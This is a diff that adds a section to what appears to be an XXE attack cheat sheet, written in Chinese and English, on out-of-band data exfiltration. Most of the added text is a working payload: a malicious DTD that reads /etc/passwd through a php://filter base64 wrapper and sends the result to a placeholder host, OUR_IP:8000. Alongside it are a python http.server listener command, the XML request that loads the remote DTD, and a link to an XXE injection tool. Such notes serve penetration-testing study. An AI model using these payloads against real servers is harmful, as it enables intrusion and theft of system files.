@@ -153,3 +153,20 @@ CDATA:
     ]>
 
 
+  (OOB) 数据窃取 (Out-of-band Data Exfiltration):
+    让 Web 应用程序向我们的 Web 服务器发送一个 Web 请求，请求中包含我们正在读取的文件内容
+
+    echo '<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">' > xxe.dtd
+    python3 -m http.server 8000
+
+    Use POST:
+    <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE email [ 
+        <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+        %remote;
+        %oob;
+      ]>
+      <root>&content;</root>
+
+Tool for 3:
+  https://github.com/enjoiz/XXEinjector
